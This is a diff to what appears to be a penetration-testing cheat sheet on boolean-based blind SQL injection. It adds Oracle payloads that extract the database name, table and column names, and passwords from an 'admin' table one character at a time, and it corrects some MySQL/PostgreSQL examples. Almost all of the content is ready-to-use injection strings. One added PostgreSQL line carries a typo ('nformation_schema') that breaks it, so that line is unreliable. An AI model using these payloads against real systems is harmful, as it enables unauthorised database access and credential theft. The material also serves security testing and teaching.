@@ -58,7 +58,25 @@ Second, retrieve the database name:
 {% endtab %}
 
 {% tab title="OracleSQL" %}
+First, retrieve the database length:
+
 ```sql
+1' AND (SELECT LENGTH(global_name) FROM global_name)=1--  #False  
+1' AND (SELECT LENGTH(global_name) FROM global_name)=2--  #False
+1' AND (SELECT LENGTH(global_name) FROM global_name)=3--  #True -> It means the length of database is 3 characters.
+```
+
+Second, retrieve the database name:
+
+```sql
+--True -> It means the first character is p. Note that ASCII code is in decimal
+1' AND (SELECT ASCII(SUBSTR(global_name, 1, 1)) FROM global_name)=112-- 
+
+--True -> It means the second character is s.
+1' AND (SELECT ASCII(SUBSTR(global_name, 2, 1)) FROM global_name)=115--
+
+--True -> It means the third character is s.
+1' AND (SELECT ASCII(SUBSTR(global_name, 3, 1)) FROM global_name)=115--
 ```
 {% endtab %}
 
@@ -164,8 +182,33 @@ Third, retrieve name of each table
 {% endtab %}
 
 {% tab title="OracleSQL" %}
+First, retrieve the number of tables:
+
 ```sql
+1' AND (SELECT COUNT(*) FROM all_tables WHERE owner = USER)=2-- #True -> 2 tables
 ```
+
+Second, retrieve length of each table
+
+```sql
+-- If True, the first table lenght is 5
+1' AND (SELECT LENGTH(table_name) FROM all_tables WHERE owner = USER OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=5--
+
+-- If True, the second table lenght is 5
+1' AND (SELECT LENGTH(table_name) FROM all_tables WHERE owner = USER OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=5-- 
+```
+
+Third, retrieve name of each table
+
+<pre class="language-sql"><code class="lang-sql">-- If True, the first char of the first table is u
+<strong>1'AND (SELECT ASCII(SUBSTR(table_name, 1, 1)) FROM all_tables WHERE owner = USER OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=117--
+</strong>
+-- If True, the second char of the first table is s
+1'AND (SELECT ASCII(SUBSTR(table_name, 2, 1)) FROM all_tables WHERE owner = USER OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=115--
+
+-- If True, the first char of the second table is p
+1'AND (SELECT ASCII(SUBSTR(table_name, 1, 1)) FROM all_tables WHERE owner = USER OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=112--
+</code></pre>
 {% endtab %}
 
 {% tab title="PostgreSQL" %}
@@ -194,7 +237,7 @@ Third, retrieve name of each table
 1'AND (SELECT ASCII(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=115--
 
 -- If True, the first char of the second table is p
-1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1,1)=112--
+1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1)) FROM nformation_schema.tables WHERE table_schema=current_database() LIMIT 1,1)=112--
 </code></pre>
 {% endtab %}
 
@@ -220,7 +263,7 @@ Second, retrieve length of each column
 -- If True, the first column's name lenght is 3
 1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=3-- - 
 
--- If True, the second table's name lenght is 8
+-- If True, the name of second column's lenght is 8
 1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=8-- - 
 ```
 
@@ -276,7 +319,33 @@ Third, retrieve name of each columns
 {% endtab %}
 
 {% tab title="OracleSQL" %}
+First, retrieve the number of columns:
+
 ```sql
+1' AND (SELECT COUNT(column_name) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE')=2--  #True -> 2 columns
+```
+
+Second, retrieve length of each column
+
+```sql
+-- If True, the first column's name lenght is 3
+1' AND (SELECT LENGTH(column_name) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=3-- 
+
+-- If True, the second column's name lenght is 8
+1' AND (SELECT LENGTH(column_name) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=8-- 
+```
+
+Third, retrieve name of each column
+
+```sql
+-- If True, the first char of the first column is a
+1'AND (SELECT ASCII(SUBSTR(column_name, 1, 1)) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=97--
+
+-- If True, the second char of the first column is b
+1'AND (SELECT ASCII(SUBSTR(column_name, 2, 1)) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=98--
+
+-- If True, the first char of the second column is p
+1'AND (SELECT ASCII(SUBSTR(column_name, 1, 1)) FROM all_tab_columns WHERE owner = USER AND table_name='TABLE_NAME_HERE' OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=112--
 ```
 {% endtab %}
 
@@ -293,7 +362,7 @@ Second, retrieve length of each column
 -- If True, the first column's name lenght is 3
 1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=3-- 
 
--- If True, the second table's name lenght is 8
+-- If True, the second column's name lenght is 8
 1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=8-- 
 ```
 
@@ -304,10 +373,10 @@ Third, retrieve name of each column
 1'AND (SELECT ASCII(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=97--
 
 -- If True, the second char of the first column is b
-1'AND (SELECT HEX(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=98--
+1'AND (SELECT ASCII(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=98--
 
 -- If True, the first char of the second column is p
-1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=112--
+1'AND (SELECT ASCII(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=112--
 ```
 {% endtab %}
 
@@ -367,7 +436,20 @@ Second, retrieve values
 {% endtab %}
 
 {% tab title="OracleSQL" %}
+First, retrieve the length of the value (we take password column as example):
+
+```sql
+1' AND (SELECT LENGTH(password) FROM admin OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=9--  #True -> 1st password is 9 char
 ```
+
+Second, retrieve values
+
+```sql
+-- If True, the first password's char is p
+1'AND (SELECT ASCII(SUBSTR(password, 1, 1)) FROM admin OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=112--
+
+-- If True, the second password's char is a
+1'AND (SELECT ASCII(SUBSTR(password, 2, 1)) FROM admin OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=97--
 ```
 {% endtab %}
 
